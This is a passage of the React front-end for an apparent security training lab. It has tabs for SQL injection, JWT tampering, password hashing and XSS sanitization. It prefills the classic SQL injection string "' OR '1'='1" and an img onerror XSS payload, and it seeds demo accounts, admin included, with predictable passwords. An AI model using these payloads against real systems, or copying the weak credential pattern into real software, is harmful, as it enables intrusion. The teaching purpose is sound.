/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import React, { useState, useEffect } from 'react';
import { 
  ShieldCheck, 
  ShieldAlert, 
  Lock, 
  Database, 
  Key, 
  Terminal, 
  Fingerprint, 
  Search, 
  RefreshCw, 
  UserPlus, 
  LogIn, 
  LogOut, 
  AlertTriangle, 
  Layers, 
  Flame, 
  Eye, 
  EyeOff, 
  Cpu, 
  FileText, 
  CheckCircle2, 
  Settings, 
  BookOpen
} from 'lucide-react';
import OwaspTop10Reference from './components/OwaspTop10Reference';
import { Note, SecretDocument, SqlQueryResponse, User } from './types';

export default function App() {
  const [activeTab, setActiveTab] = useState<'overview' | 'sql-lab' | 'jwt-vault' | 'hash-lab' | 'xss-lab' | 'owasp-ref'>('overview');
  const [currentTime, setCurrentTime] = useState<string>('2026-06-02 13:04:22');
  
  // Auth state
  const [sessionToken, setSessionToken] = useState<string | null>(null);
  const [currentUser, setCurrentUser] = useState<User | null>(null);
  const [authError, setAuthError] = useState<string | null>(null);
  const [authSuccess, setAuthSuccess] = useState<string | null>(null);
  
  // Forms
  const [loginUsername, setLoginUsername] = useState('');
  const [loginPassword, setLoginPassword] = useState('');
  const [loginShowPassword, setLoginShowPassword] = useState(false);
  
  const [regUsername, setRegUsername] = useState('');
  const [regPassword, setRegPassword] = useState('');
  const [regRole, setRegRole] = useState<'user' | 'guest'>('user');
  
  // Custom Notes state
  const [notes, setNotes] = useState<Note[]>([]);
  const [newNoteContent, setNewNoteContent] = useState('');
  const [newNoteIsPublic, setNewNoteIsPublic] = useState(true);
  const [secrets, setSecrets] = useState<SecretDocument[]>([]);
  const [secretsError, setSecretsError] = useState<string | null>(null);

  // SQL Injection Lab state
  const [sqlSearch, setSqlSearch] = useState("' OR '1'='1");
  const [sqlMode, setSqlMode] = useState<'vulnerable' | 'secure'>('vulnerable');
  const [sqlResponse, setSqlResponse] = useState<SqlQueryResponse | null>(null);
  const [sqlLoading, setSqlLoading] = useState(false);

  // JWT Tamper Lab state
  const [jwtTokenInput, setJwtTokenInput] = useState('');
  const [jwtCustomSecret, setJwtCustomSecret] = useState('');
  const [jwtHeaderJson, setJwtHeaderJson] = useState('{\n  "alg": "HS256",\n  "typ": "JWT"\n}');
  const [jwtPayloadJson, setJwtPayloadJson] = useState('{\n  "id": 2,\n  "username": "alice",\n  "role": "user",\n  "iss": "gai_security_lab"\n}');
  const [jwtSignatureInput, setJwtSignatureInput] = useState('XyZ_signature_66x99_placeholder');
  const [jwtVerificationResult, setJwtVerificationResult] = useState<any>(null);
  const [jwtLogs, setJwtLogs] = useState<string[]>([]);

  // PBKDF2 Password Lab state
  const [hashPasswordInput, setHashPasswordInput] = useState('SuperSecretPass');
  const [hashIterations, setHashIterations] = useState(10000);
  const [hashSaltInput, setHashSaltInput] = useState('8bdf38c5a2e1d0f5');
  const [hashResult, setHashResult] = useState<any>(null);
  const [hashLoading, setHashLoading] = useState(false);

  // XSS Sanitization Lab state
  const [xssInput, setXssInput] = useState("<img src='x' onerror='alert(\"XSS execution!\");' />");
  const [xssResult, setXssResult] = useState<any>(null);

  // Clock ticking simulator
  useEffect(() => {
    const timer = setInterval(() => {
      const now = new Date();
      setCurrentTime(now.getUTCFullYear() + '-' + 
        String(now.getUTCMonth() + 1).padStart(2, '0') + '-' + 
        String(now.getUTCDate()).padStart(2, '0') + ' ' + 
        String(now.getUTCHours()).padStart(2, '0') + ':' + 
        String(now.getUTCMinutes()).padStart(2, '0') + ':' + 
        String(now.getUTCSeconds()).padStart(2, '0') + ' UTC'
      );
    }, 1000);
    return () => clearInterval(timer);
  }, []);

  // Fetch baseline public notes on startup
  const fetchNotes = async () => {
    try {
      const res = await fetch('/api/notes');
      if (res.ok) {
        const data = await res.json();
        setNotes(data.notes || []);
      }
    } catch (e) {
      console.error("Error fetching notes:", e);
    }
  };

  useEffect(() => {
    fetchNotes();
  }, []);

  // Auto-fill active JWT components when token updates
  useEffect(() => {
    if (sessionToken) {
      try {
        const parts = sessionToken.split('.');
        if (parts.length === 3) {
          const rawHeader = atob(parts[0].replace(/-/g, '+').replace(/_/g, '/'));
          const rawPayload = atob(parts[1].replace(/-/g, '+').replace(/_/g, '/'));
          setJwtHeaderJson(JSON.stringify(JSON.parse(rawHeader), null, 2));
          setJwtPayloadJson(JSON.stringify(JSON.parse(rawPayload), null, 2));
          setJwtSignatureInput(parts[2]);
          setJwtTokenInput(sessionToken);
        }
      } catch (err) {
        console.error("Error encoding preview segments:", err);
      }
    }
  }, [sessionToken]);

  // Authenticate user check
  const checkSession = async (token: string) => {
    try {
      const res = await fetch('/api/auth/me', {
        headers: { 'Authorization': `Bearer ${token}` }
      });
      if (res.ok) {
        const data = await res.json();
        setCurrentUser(data.user);
        setSessionToken(token);
        fetchSecrets(token);
      } else {
        handleLogout();
      }
    } catch (e) {
      handleLogout();
    }
  };

  // Fetch Classified Secrets (Admin Only Role check demo)
  const fetchSecrets = async (token: string) => {
    setSecretsError(null);
    try {
      const res = await fetch('/api/secrets', {
        headers: { 'Authorization': `Bearer ${token}` }
      });
      const data = await res.json();
      if (res.ok) {
        setSecrets(data.secrets || []);
      } else {
        setSecrets([]);
        setSecretsError(data.error || 'Server rejected query');
      }
    } catch (err: any) {
      setSecretsError('Network error during secrets RBAC query');
    }
  };

  // Handle Register
  const handleRegister = async (e: React.FormEvent) => {
    e.preventDefault();
    setAuthError(null);
    setAuthSuccess(null);
    if (!regUsername || !regPassword) {
      setAuthError('Validation Error: Form cannot be submitted with empty string attributes.');
      return;
    }
    try {
      const res = await fetch('/api/auth/register', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username: regUsername, password: regPassword, role: regRole })
      });
      const data = await res.json();
      if (res.ok) {
        setAuthSuccess(`Secure key-derivation finished. Created [${data.user.username}] with role [${data.user.role}]. Synchronizing current identity state.`);
        setSessionToken(data.token);
        setCurrentUser(data.user);
        setRegUsername('');
        setRegPassword('');
        fetchSecrets(data.token);
        fetchNotes();
      } else {
        setAuthError(data.error || 'Registration failed');
      }
    } catch (err) {
      setAuthError('Unable to connect to crypto endpoint');
    }
  };

  // Handle Login
  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    setAuthError(null);
    setAuthSuccess(null);
    if (!loginUsername || !loginPassword) {
      setAuthError('Authentication Error: Full passport attributes must be specified.');
      return;
    }
    try {
      const res = await fetch('/api/auth/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username: loginUsername, password: loginPassword })
      });
      const data = await res.json();
      if (res.ok) {
        setAuthSuccess(`Authorization Token acquired. Logged in as: [${data.user.username}] with clearance [${data.user.role.toUpperCase()}].`);
        setSessionToken(data.token);
        setCurrentUser(data.user);
        setLoginUsername('');
        setLoginPassword('');
        fetchSecrets(data.token);
        fetchNotes();
      } else {
        setAuthError(data.error || 'Identity verification failed');
      }
    } catch (err) {
      setAuthError('Remote login server took long or returned error');
    }
  };

  const handleLogout = () => {
    setSessionToken(null);
    setCurrentUser(null);
    setSecrets([]);
    setSecretsError(null);
    setAuthSuccess('Credentials terminated safely. JWT removed from local browser state.');
  };

  // Create Note
  const handleCreateNote = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!newNoteContent.trim()) return;
    if (!sessionToken) {
      setAuthError("You must have active authorization credentials to compose entries.");
      return;
    }
    try {
      const res = await fetch('/api/notes', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${sessionToken}`
        },
        body: JSON.stringify({ content: newNoteContent, isPublic: newNoteIsPublic })
      });
      if (res.ok) {
        setNewNoteContent('');
        fetchNotes();
      } else {
        const data = await res.json();
        setAuthError(data.error || 'Failed to submit entry');
      }
    } catch (err) {
      setAuthError('Connection problem when writing to notes table');
    }
  };

  // SQL LAB runner
  const handleRunSqlLab = async (e: React.FormEvent) => {
    e.preventDefault();
    setSqlLoading(true);
    try {
      const res = await fetch('/api/security/sql-lab', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ searchParam: sqlSearch, mode: sqlMode })
      });
      const data = await res.json();
      setSqlResponse(data);
    } catch (error) {
      console.error(error);
    } finally {
      setSqlLoading(false);
    }
  };

  // JWT Custom Encoder (Client Side Simulation)
  const regenerateJwtOnClient = () => {
    // Generates a mock or simulated JWT using base64 for visualization
    try {
      const parsedHeader = JSON.parse(jwtHeaderJson);
      const parsedPayload = JSON.parse(jwtPayloadJson);
      const encHeader = btoa(JSON.stringify(parsedHeader)).replace(/=/g, '').replace(/\+/g, '-').replace(/\//g, '_');
      const encPayload = btoa(JSON.stringify(parsedPayload)).replace(/=/g, '').replace(/\+/g, '-').replace(/\//g, '_');
      const message = `${encHeader}.${encPayload}`;
      
      setJwtTokenInput(`${message}.${jwtSignatureInput}`);
      setJwtLogs(prev => [`[Client] Re-assembled JWT fields base64url blocks into localized model.`, ...prev]);
    } catch (err: any) {
      setJwtLogs(prev => [`[ERROR] Local base64 parsing failed: ${err.message}`, ...prev]);
    }
  };

  // Verify custom JWT with Server
  const handleVerifyJwtServer = async () => {
    if (!jwtTokenInput) return;
    setJwtLogs(prev => [`[Server] Posting payload stream to endpoint for evaluation...`, ...prev]);
    try {
      const res = await fetch('/api/security/jwt-tamper-lab', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          token: jwtTokenInput, 
          attemptKeySignature: jwtCustomSecret || undefined 
        })
      });
      const data = await res.json();
      setJwtVerificationResult(data);
      if (data.isValid) {
        setJwtLogs(prev => [`[SUCCESS] Cryptographic verification matches server validation loop! Output matches.`, ...prev]);
      } else {
        setJwtLogs(prev => [`[REJECTED] The payload HMAC checksum did not match computed state. Input modified or key differs.`, ...prev]);
      }
    } catch (error: any) {
      setJwtLogs(prev => [`[FAILED] Call rejected: ${error.message}`, ...prev]);
    }
  };

  // PBKDF2 HASH LAB runner
  const handleRunHashLab = async (e: React.FormEvent) => {
    e.preventDefault();
    setHashLoading(true);
    try {
      const res = await fetch('/api/security/hash-lab', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          password: hashPasswordInput, 
          iterations: hashIterations, 
          salt: hashSaltInput 
        })
      });
      const data = await res.json();
      setHashResult(data);
    } catch (error) {
      console.error(error);
    } finally {
      setHashLoading(false);
    }
  };

  // XSS sanitization lab runner
  const handleRunXssLab = (e: React.FormEvent) => {
    e.preventDefault();
    const map: Record<string, string> = {
      '&': '&amp;',
      '<': '&lt;',
      '>': '&gt;',
      '"': '&quot;',
      "'": '&#x27;',
      '/': '&#x2F;'
    };
    const sanitized = xssInput.replace(/[&<>"'/]/g, m => map[m]);
    setXssResult({
      original: xssInput,
      sanitized,
      explanation: 'Sanitization successfully escapes control symbols, protecting DOM tree context from malicious execution blocks.'
    });
  };

  // Shortcut login helper function
  const fastLogin = async (username: string) => {
    setAuthError(null);
    setAuthSuccess(null);
    try {
      const res = await fetch('/api/auth/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username, password: `${username}123` })
      });
      const data = await res.json();
      if (res.ok) {
        setAuthSuccess(`Authorization Success! Quickly signed in as default user: [${data.user.username.toUpperCase()}]`);
        setSessionToken(data.token);
        setCurrentUser(data.user);
        fetchSecrets(data.token);
        fetchNotes();
      } else {
        setAuthError(data.error || 'Quick authentication bypassed or failed');
      }
    } catch (err) {
      setAuthError('Express dev-server of app has not yet finished startup');
    }
  };

  return (
    <div id="app-root" className="min-h-screen bg-[#05070a] text-[#e2e8f0] font-sans text-sm flex flex-col md:flex-row overflow-x-hidden selection:bg-emerald-500/30 selection:text-emerald-200">
      
      {/* SIDEBAR */}
      <aside id="sidebar" className="w-full md:w-[240px] bg-[#0a0f18] border-r md:border-b-0 border-[#1e293b] flex flex-col p-5 shrink-0">
        <div className="flex items-center gap-2.5 mb-8">
          <div className="w-4 h-4 bg-emerald-500 rounded-sm shadow-[0_0_10px_rgba(16,185,129,0.3)] anim-pulse"></div>
          <span className="font-extrabold tracking-tight text-white hover:text-emerald-400 transition-colors">SENTINEL OS</span>
        </div>

        <nav className="flex flex-col gap-1.5 flex-grow">
          <button 
            id="nav-overview"
            onClick={() => setActiveTab('overview')}
            className={`flex items-center gap-3 px-3.5 py-2.5 rounded text-xs tracking-wider uppercase transition-all duration-150 text-left font-mono ${activeTab === 'overview' ? 'bg-[#1e293b] text-white border-l-2 border-emerald-500 font-semibold' : 'text-[#94a3b8] hover:bg-[#131b2b] hover:text-[#f8fafc]'}`}
          >
            <Layers className="w-4 h-4 shrink-0" />
            Security Overview
          </button>

          <button 
            id="nav-sql-lab"
            onClick={() => {
              setActiveTab('sql-lab');
              // trigger initial lab simulation automatically
              if(!sqlResponse) {
                setTimeout(() => {
                  const fakeEvent = { preventDefault: () => {} } as any;
                  handleRunSqlLab(fakeEvent);
                }, 50);
              }
            }}
            className={`flex items-center gap-3 px-3.5 py-2.5 rounded text-xs tracking-wider uppercase transition-all duration-150 text-left font-mono ${activeTab === 'sql-lab' ? 'bg-[#1e293b] text-white border-l-2 border-emerald-500 font-semibold' : 'text-[#94a3b8] hover:bg-[#131b2b] hover:text-[#f8fafc]'}`}
          >
            <Database className="w-4 h-4 shrink-0 text-cyan-400" />
            SQL Injection Lab
          </button>

          <button 
            id="nav-jwt-vault"
            onClick={() => setActiveTab('jwt-vault')}
            className={`flex items-center gap-3 px-3.5 py-2.5 rounded text-xs tracking-wider uppercase transition-all duration-150 text-left font-mono ${activeTab === 'jwt-vault' ? 'bg-[#1e293b] text-white border-l-2 border-emerald-500 font-semibold' : 'text-[#94a3b8] hover:bg-[#131b2b] hover:text-[#f8fafc]'}`}
          >
            <Fingerprint className="w-4 h-4 shrink-0 text-emerald-400" />
            JWT Token Vault
          </button>

          <button 
            id="nav-hash-lab"
            onClick={() => setActiveTab('hash-lab')}
            className={`flex items-center gap-3 px-3.5 py-2.5 rounded text-xs tracking-wider uppercase transition-all duration-150 text-left font-mono ${activeTab === 'hash-lab' ? 'bg-[#1e293b] text-white border-l-2 border-emerald-500 font-semibold' : 'text-[#94a3b8] hover:bg-[#131b2b] hover:text-[#f8fafc]'}`}
          >
            <Lock className="w-4 h-4 shrink-0 text-purple-400" />
            PBKDF2 Crypt Lab
          </button>

          <button 
            id="nav-xss-lab"
            onClick={() => setActiveTab('xss-lab')}
            className={`flex items-center gap-3 px-3.5 py-2.5 rounded text-xs tracking-wider uppercase transition-all duration-150 text-left font-mono ${activeTab === 'xss-lab' ? 'bg-[#1e293b] text-white border-l-2 border-emerald-500 font-semibold' : 'text-[#94a3b8] hover:bg-[#131b2b] hover:text-[#f8fafc]'}`}
          >
            <Terminal className="w-4 h-4 shrink-0 text-amber-500" />
            XSS Sanitizer
          </button>

          <button 
            id="nav-owasp-ref"
            onClick={() => setActiveTab('owasp-ref')}
            className={`flex items-center gap-3 px-3.5 py-2.5 rounded text-xs tracking-wider uppercase transition-all duration-150 text-left font-mono ${activeTab === 'owasp-ref' ? 'bg-[#1e293b] text-white border-l-2 border-emerald-500 font-semibold' : 'text-[#94a3b8] hover:bg-[#131b2b] hover:text-[#f8fafc]'}`}
          >
            <BookOpen className="w-4 h-4 shrink-0 text-indigo-400" />
            OWASP Top 10
          </button>
        </nav>

        {/* SYSTEM STATUS FOOTER */}
        <div className="mt-8 pt-4 border-t border-[#1e293b] text-[10px] text-[#475569] font-mono space-y-1">
          <div>BUILD v2.4.0-STABLE</div>
          <div>SESSION: DEF_LAB_2026</div>
          <div className="text-emerald-500/80 flex items-center gap-1 mt-1 justify-between">
            <span>● DB ENGINE ONLINE</span>
            <span className="animate-pulse">●SECURE</span>
          </div>
        </div>
      </aside>

      {/* MAIN CONTAINER */}
      <main id="main-content" className="flex-1 flex flex-col bg-[#05070a] overflow-y-auto">
        
        {/* HEADER BAR */}
        <header id="header" className="h-16 border-b border-[#1e293b] bg-[#0a0f18] px-6 flex items-center justify-between shrink-0">
          <div className="flex items-center gap-2 font-mono text-xs">
            <span className="text-[#64748b]">DASHBOARD</span>
            <span className="text-[#334155]">/</span>
            <span className="text-[#f8fafc] font-black uppercase text-emerald-400 tracking-wider">
              {activeTab === 'overview' ? 'Live_Cleared_Portal' : `${activeTab.replace('-', '_')}_module`}
            </span>
          </div>

          <div className="flex items-center gap-4">
            <div className="hidden lg:flex items-center gap-2.5">
              <span className="status-pill text-[10px] px-2 py-0.5 rounded-full font-mono text-emerald-400 bg-emerald-500/10 border border-emerald-500/20">
                SQL SHIELD: ACTIVE
              </span>
              <span className="status-pill text-[10px] px-2 py-0.5 rounded-full font-mono text-cyan-400 bg-cyan-400/10 border border-cyan-400/20">
                HMAC SIGN: ATTACHED
              </span>
            </div>
            
            <div className="text-xs font-mono text-[#94a3b8] bg-[#0f172a] px-3 py-1 border border-[#1e293b] rounded">
              {currentTime}
            </div>
          </div>
        </header>

        {/* ALERTS POPUP BAR */}
        {authError && (
          <div className="mx-6 mt-4 p-3 bg-red-950/40 border border-red-500/30 text-red-200 text-xs rounded flex items-center justify-between gap-3 animate-fade-in font-mono">
            <div className="flex items-center gap-2">
              <ShieldAlert className="w-4 h-4 text-red-400 shrink-0" />
              <span>{authError}</span>
            </div>
            <button onClick={() => setAuthError(null)} className="text-red-400 hover:text-red-200 font-bold px-1 text-sm">×</button>
          </div>
        )}

        {authSuccess && (
          <div className="mx-6 mt-4 p-3 bg-emerald-950/40 border border-emerald-500/30 text-emerald-200 text-xs rounded flex items-center justify-between gap-3 animate-fade-in font-mono">
            <div className="flex items-center gap-2">
              <ShieldCheck className="w-4 h-4 text-emerald-400 shrink-0" />
              <span>{authSuccess}</span>
            </div>
            <button onClick={() => setAuthSuccess(null)} className="text-emerald-400 hover:text-emerald-200 font-bold px-1 text-sm">×</button>
          </div>
        )}

        {/* PRIMARY LAB SECTIONS */}
        <div className="p-6 space-y-6 flex-grow">

          {/* ACTIVE TAB: OVERVIEW / IDENTITY ACCREDITATION */}
          {activeTab === 'overview' && (
            <div className="space-y-6">
              
              {/* TELEMETRY METRICS SECTION */}
              <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
                <div className="stat-card p-4 rounded bg-[#0f172a] border border-[#1e293b] flex flex-col gap-1.5 transition-all hover:border-[#38bdf8]/40">
                  <span className="label text-[10px] text-[#94a3b8] font-bold uppercase tracking-wider font-mono">Session Identity</span>
                  <span className="value text-lg font-bold font-mono text-white">
                    {currentUser ? currentUser.username.toUpperCase() : 'ANONYMOUS GUEST'}
                  </span>
                  <span className="text-[10px] text-emerald-400 flex items-center gap-1 font-mono">
                    Clearance: {currentUser ? currentUser.role.toUpperCase() : 'GUEST'}
                  </span>
                </div>

                <div className="stat-card p-4 rounded bg-[#0f172a] border border-[#1e293b] flex flex-col gap-1.5 transition-all hover:border-[#38bdf8]/40">
                  <span className="label text-[10px] text-[#94a3b8] font-bold uppercase tracking-wider font-mono">Auth Token Status</span>
                  <span className="value text-lg font-bold font-mono text-[#38bdf8] truncate max-w-xs">
                    {sessionToken ? ' bearerHS256...' : 'MISSING_PAYLOAD'}
                  </span>
                  <span className="text-[10px] text-[#94a3b8] font-mono">
                    {sessionToken ? 'Signature MAC evaluated' : 'Authorize to sign token'}
                  </span>
                </div>

                <div className="stat-card p-4 rounded bg-[#0f172a] border border-[#1e293b] flex flex-col gap-1.5 transition-all hover:border-[#38bdf8]/40">
                  <span className="label text-[10px] text-[#94a3b8] font-bold uppercase tracking-wider font-mono">Security Model Mode</span>
                  <span className="value text-lg font-bold font-mono text-emerald-400">
                    PBKDF2-SHA512
                  </span>
                  <span className="text-[10px] text-emerald-500 font-mono">
                    STRETCH: 10k ROUNDS
                  </span>
                </div>

                <div className="stat-card p-4 rounded bg-[#0f172a] border border-[#1e293b] flex flex-col gap-1.5 transition-all hover:border-[#38bdf8]/40">
                  <span className="label text-[10px] text-[#94a3b8] font-bold uppercase tracking-wider font-mono">OWASP Mitigation Index</span>
                  <span className="value text-lg font-bold font-mono text-[#f8fafc]">
                    A1, A2, A3, A5, A7
                  </span>
                  <span className="text-[10px] text-cyan-400 font-mono">
                    AUDIT RATING: COMPLIANT
                  </span>
                </div>
              </div>

              {/* SPLIT COLUMN: CREDENTIALS MANAGEMENT & REAL-TIME LOGS DB */}
              <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
                
                {/* ACCOUNT PROFILE PORTAL (5 cols) */}
                <div className="lg:col-span-5 bg-[#0a0f18] border border-[#1e293b] rounded p-5 flex flex-col space-y-4">
                  <div className="flex items-center justify-between border-b border-[#1e293b] pb-3">
                    <span className="font-mono text-xs text-[#94a3b8] font-bold uppercase tracking-wide flex items-center gap-1.5">
                      <Fingerprint className="w-4 h-4 text-emerald-400" /> Identity Portal
                    </span>
                    {currentUser && (
                      <button 
                        onClick={handleLogout}
                        className="text-[10px] text-rose-400 hover:text-rose-300 font-mono flex items-center gap-1 transition-all bg-rose-500/10 px-2 py-0.5 border border-rose-500/20 rounded"
                      >
                        <LogOut className="w-3 h-3" /> Terminate Session
                      </button>
                    )}
                  </div>

                  {!currentUser ? (
                    <div className="space-y-4">
                      {/* FAST AUTO LOGIN OPTIONS FOR TESTING */}
                      <div className="p-3 bg-[#131b2b] border border-[#1e293b] rounded space-y-2">
                        <span className="text-[10px] text-cyan-400 font-mono font-bold uppercase tracking-wider block">
                          ⚡ Fast Login Simulation (No setup required)
                        </span>
                        <p className="text-[11px] text-gray-400">
                          Securely pre-seeded with PBKDF2 hash tables. Select an identity to login and inspect structural clearance:
                        </p>
                        <div className="grid grid-cols-2 gap-1.5 pt-1">
                          <button 
                            onClick={() => fastLogin('admin')}
                            className="bg-[#0f172a] hover:bg-[#1e293b] text-[11px] font-mono text-rose-300 border border-[#1e293b] px-2 py-1 rounded text-left flex justify-between items-center"
                          >
                            <span>👤 admin</span>
                            <span className="text-[9px] bg-rose-500/10 text-rose-300 px-1 rounded font-bold uppercase">Admin</span>
                          </button>
                          
                          <button 
                            onClick={() => fastLogin('alice')}
                            className="bg-[#0f172a] hover:bg-[#1e293b] text-[11px] font-mono text-emerald-300 border border-[#1e293b] px-2 py-1 rounded text-left flex justify-between items-center"
                          >
                            <span>👤 alice</span>
                            <span className="text-[9px] bg-emerald-500/10 text-emerald-400 px-1 rounded font-bold uppercase">User</span>
                          </button>

                          <button 
                            onClick={() => fastLogin('bob')}
                            className="bg-[#0f172a] hover:bg-[#1e293b] text-[11px] font-mono text-emerald-300 border border-[#1e293b] px-2 py-1 rounded text-left flex justify-between items-center"
                          >
                            <span>👤 bob</span>
                            <span className="text-[9px] bg-emerald-500/10 text-emerald-400 px-1 rounded font-bold uppercase">User</span>
                          </button>

                          <button 
                            onClick={() => fastLogin('guest_user')}
                            className="bg-[#0f172a] hover:bg-[#1e293b] text-[11px] font-mono text-gray-400 border border-[#1e293b] px-2 py-1 rounded text-left flex justify-between items-center"
                          >
                            <span>👤 guest_user</span>
                            <span className="text-[9px] bg-gray-500/10 text-gray-400 px-1 rounded font-bold">GUEST</span>
                          </button>
                        </div>
                      </div>

                      {/* STANDARD LOGIN FORM */}
                      <form onSubmit={handleLogin} className="space-y-2.5">
                        <div className="text-[10px] text-[#94a3b8] font-mono font-bold uppercase tracking-wider block">
                          Standard Credentials Login
                        </div>
                        <div>
                          <label className="text-[10px] text-gray-400 block mb-1">Username Address</label>
                          <input 
                            type="text" 
                            value={loginUsername}
                            onChange={(e) => setLoginUsername(e.target.value)}
                            className="w-full bg-[#05070a] border border-[#1e293b] rounded py-1.5 px-2.5 text-xs text-white focus:outline-none focus:border-emerald-500/80 font-mono"
                            placeholder="e.g. alice, admin..."
                          />
                        </div>
                        <div>
                          <label className="text-[10px] text-gray-400 block mb-1">Passphrase Secret</label>
                          <div className="relative">
                            <input 
                              type={loginShowPassword ? "text" : "password"} 
                              value={loginPassword}
                              onChange={(e) => setLoginPassword(e.target.value)}
                              className="w-full bg-[#05070a] border border-[#1e293b] rounded py-1.5 px-2.5 text-xs text-white focus:outline-none focus:border-emerald-500/80 font-mono"
                              placeholder="••••••••••••"
                            />
                            <button 
                              type="button" 
                              onClick={() => setLoginShowPassword(!loginShowPassword)}
                              className="absolute right-2.5 top-1.5 text-gray-400 hover:text-white"
                            >
                              {loginShowPassword ? <EyeOff className="w-3.5 h-3.5" /> : <Eye className="w-3.5 h-3.5" />}
                            </button>
                          </div>
                        </div>
                        <button 
                          type="submit"
                          className="w-full bg-[#1e293b] hover:bg-[#131b2b] hover:text-emerald-400 border border-emerald-500/20 text-white font-mono text-xs py-1.5 rounded transition-all flex items-center justify-center gap-1.5"
                        >
                          <LogIn className="w-3.5 h-3.5" /> Verify Passport
                        </button>
                      </form>

                      {/* NEW USER SIGNUP DEMO */}
                      <div className="pt-3 border-t border-[#1e293b]">
                        <form onSubmit={handleRegister} className="space-y-2.5">
                          <span className="text-[10px] text-cyan-400 font-mono font-bold uppercase tracking-wider block">
                            Register New Account (Salted PBKDF2)
                          </span>
                          <div className="grid grid-cols-2 gap-2">
                            <div>
                              <label className="text-[10px] text-gray-400 block mb-1">New User</label>
                              <input 
                                type="text"
                                value={regUsername}
                                onChange={(e) => setRegUsername(e.target.value)}
                                className="w-full bg-[#05070a] border border-[#1e293b] rounded py-1 px-2 text-xs text-white focus:outline-none focus:border-[#38bdf8] font-mono"
                                placeholder="name"
                              />
                            </div>
                            <div>
                              <label className="text-[10px] text-gray-400 block mb-1">Password</label>
                              <input 
                                type="password" 
                                value={regPassword}
                                onChange={(e) => setRegPassword(e.target.value)}
                                className="w-full bg-[#05070a] border border-[#1e293b] rounded py-1 px-2 text-xs text-white focus:outline-none focus:border-[#38bdf8] font-mono"
                                placeholder="6+ chars"
                              />
                            </div>
                          </div>
                          <div>
                            <label className="text-[10px] text-gray-400 block mb-1">Role Allocation Class</label>
                            <select 
                              value={regRole} 
                              onChange={(e) => setRegRole(e.target.value as any)}
                              className="w-full bg-[#05070a] border border-[#1e293b] rounded py-1 px-2 text-xs text-white focus:outline-none focus:border-[#38bdf8] font-mono"
                            >
                              <option value="user">User Clearance (standard notes, basic JWT)</option>
                              <option value="guest">Guest Clearance (read-only state)</option>
                            </select>
                          </div>
                          <button 
                            type="submit"
                            className="w-full bg-[#1e293b] hover:bg-[#0f172a] text-[#38bdf8] border border-[#38bdf8]/20 font-mono text-xs py-1.5 rounded transition-all flex items-center justify-center gap-1.5"
                          >
                            <UserPlus className="w-3.5 h-3.5" /> Initialize Cryptographic Salt
                          </button>
                        </form>
                      </div>
                    </div>
                  ) : (
                    <div className="space-y-4">
                      {/* LOGGED IN ACCOUNT CARD */}
                      <div className="bg-[#0f172a] border border-[#1e293b] rounded p-4 space-y-3 font-mono">
                        <div className="flex items-center justify-between border-b border-[#1e293b] pb-2">
                          <span className="text-[#94a3b8] text-xs">Clearance Class</span>
                          <span className={`px-2 py-0.5 rounded text-[10px] font-bold ${currentUser.role === 'admin' ? 'bg-rose-500/10 text-rose-300 border border-rose-500/20' : 'bg-emerald-500/10 text-emerald-400 border border-emerald-500/25'}`}>
                            {currentUser.role.toUpperCase()}
                          </span>
                        </div>
                        <div className="space-y-1 text-xs">
                          <div className="flex justify-between">
                            <span className="text-gray-500">Subject Token:</span>
                            <span className="text-white font-bold">{currentUser.username}</span>
                          </div>
                          <div className="flex justify-between">
                            <span className="text-gray-500 font-mono">Registered ID:</span>
                            <span className="text-gray-400">UID_{currentUser.id.toString().padStart(4, '0')}</span>
                          </div>
                          <div className="pt-2 border-t border-[#1e293b]/50">
                            <span className="text-gray-500 block mb-1">Decoded Profile Bio:</span>
                            <p className="text-gray-400 text-[11px] leading-relaxed italic">
                              "{currentUser.bio || 'Clearance attributes verified.'}"
                            </p>
                          </div>
                        </div>
                      </div>

                      {/* COMPOSE ENTRY FORM */}
                      <form onSubmit={handleCreateNote} className="space-y-2.5">
                        <span className="text-[10px] font-mono text-emerald-400 font-bold uppercase tracking-wider block">
                          📝 Log secure entry content
                        </span>
                        <div>
                          <textarea 
                            rows={2}
                            value={newNoteContent}
                            onChange={(e) => setNewNoteContent(e.target.value)}
                            className="w-full bg-[#05070a] border border-[#1e293b] rounded py-1.5 px-2.5 text-xs text-white focus:outline-none focus:border-emerald-500 font-sans"
                            placeholder="Type entry content here, standard XSS sanitization mitigates malicious input execution..."
                          />
                        </div>
                        <div className="flex items-center justify-between gap-2">
                          <div className="flex items-center gap-1.5">
                            <input 
                              type="checkbox" 
                              id="note-public"
                              checked={newNoteIsPublic}
                              onChange={(e) => setNewNoteIsPublic(e.target.checked)}
                              className="accent-emerald-500 rounded text-[#05070a]"
                            />
                            <label htmlFor="note-public" className="text-[11px] text-[#94a3b8] cursor-pointer">
                              Publish to standard shared feeds
                            </label>
                          </div>
                          <button 
                            type="submit"
                            className="bg-emerald-500/10 hover:bg-emerald-500/20 text-emerald-400 border border-emerald-500/30 text-xs px-3 py-1 rounded font-mono font-semibold"
                          >
                            Post Record
                          </button>
                        </div>
                      </form>
                    </div>
                  )}
                </div>

                {/* SECURED NOTE DATABASE LAB + ROLE-BASED ACCESS CONTROL PORTAL (7 cols) */}
                <div className="lg:col-span-7 space-y-6">
                  
                  {/* PUBLIC NOTES FEED */}
                  <div className="bg-[#0a0f18] border border-[#1e293b] rounded p-5 space-y-4">
                    <span className="font-mono text-xs text-[#94a3b8] font-bold uppercase tracking-wide block border-b border-[#1e293b] pb-2">
                      📋 Standard Shared Notes Log (Simulated SQL Read Feed)
                    </span>
                    
                    <div className="space-y-2.5 max-h-[160px] overflow-y-auto pr-1">
                      {notes.length === 0 ? (
                        <div className="text-center py-6 text-gray-500 font-mono text-xs">
                          No notes have been registered inside the state memory structures.
                        </div>
                      ) : (
